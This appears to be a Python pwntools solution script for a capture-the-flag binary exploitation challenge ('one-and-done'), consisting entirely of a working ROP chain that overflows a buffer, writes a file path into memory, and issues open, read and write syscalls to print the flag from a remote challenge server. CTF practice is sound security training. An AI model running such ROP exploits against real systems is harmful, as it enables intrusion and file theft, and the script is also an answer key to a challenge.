from pwn import *

# 0x000000000040100b: pop rax; ret;
def pop_rax(v):
  try:
    return p64(0x000000000040100b) + p64(v)
  except struct.error:
    return p64(0x000000000040100b) + v

# 0x0000000000401793: pop rdi; ret;
def pop_rdi(v):
  return p64(0x0000000000401793) + p64(v)
# 0x0000000000401713: pop rsi; ret;
def pop_rsi(v):
  return p64(0x0000000000401713) + p64(v)
# 0x0000000000401f31: pop rdx; ret;
def pop_rdx(v):
  return p64(0x0000000000401f31) + p64(v)
# 0x0000000000401ab2: syscall; ret;
def syscall():
  return p64(0x0000000000401ab2)

# 0x000000000040213a: mov dword ptr [rdi], eax; or eax, 0xffffffff; ret;
def write_into_rdi_eax():
  return p64(0x000000000040213a)

def WriteStringToLocation(string, location):
  string = string + b'\0' * (4 - (len(string) % 4))
  o = b''
  for i in range(0, len(string), 4):
    s = string[i:i+4] + b'\0' * 4
    o += pop_rdi(location)
    o += pop_rax(s)
    o += write_into_rdi_eax()

    location += 4

  return o


padding = cyclic(1024).split(b'yaaczaad')[0]
bss = 0x0000000000405340

payload = padding
# payload += WriteStringToLocation(b'flag.txt', bss)
payload += WriteStringToLocation(b'/pwn/flag.txt', bss)

# open('/pwn/flag.txt', O_RDONLY)
payload += pop_rax(2) #open
payload += pop_rdi(bss)
payload += pop_rsi(0)
payload += pop_rdx(0)
payload += syscall()

# read(fp, bss(flag), 50)
payload += pop_rax(0) #read
payload += pop_rdi(3) #fp
payload += pop_rsi(bss)
payload += pop_rdx(50)
payload += syscall()

# write(stdout, bss(flag), 50)
payload += pop_rax(1) #write
payload += pop_rdi(1) #fp
payload += pop_rsi(bss)
payload += pop_rdx(50)
payload += syscall()

open('tmp', 'wb').write(payload)

p = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
# p = process('./one-and-done')
p.recvline()
p.sendline(payload)
print(p.recvline())
